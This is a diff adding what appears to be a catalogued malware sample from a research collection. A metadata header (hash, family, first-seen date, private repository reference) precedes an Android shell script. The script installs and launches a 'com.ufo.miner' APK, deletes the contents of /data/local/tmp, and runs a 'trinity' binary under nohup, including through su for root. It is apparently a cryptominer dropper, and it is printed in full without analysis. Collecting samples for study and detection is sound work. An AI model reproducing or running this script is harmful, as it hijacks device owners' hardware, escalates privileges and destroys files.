@@ -1,0 +1,20 @@
+# sha256: 4ee79e33fb673007a922b26efa8c53573927ab300f2e0d80327c2b5462c53a0d
+# family: script_generic
+# kind: script
+# size_bytes: 351
+# first_seen: 2026-08-23 21:33:12.991000 UTC
+# times_seen: 1
+# yara_matches: none
+# malware_sample: 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64 (ver lazareto/familias/ - repo privado)
+# ------------------------------------------------------------
+
+pm path com.ufo.miner
+pm install /data/local/tmp/ufo.apk
+rm -f /data/local/tmp/ufo.apk
+am start -n com.ufo.miner/com.example.test.MainActivity
+ps | grep trinity
+rm -rf /data/local/tmp/*
+chmod 0755 /data/local/tmp/nohup
+chmod 0755 /data/local/tmp/trinity
+/data/local/tmp/nohup su -c /data/local/tmp/trinity
+/data/local/tmp/nohup /data/local/tmp/trinity
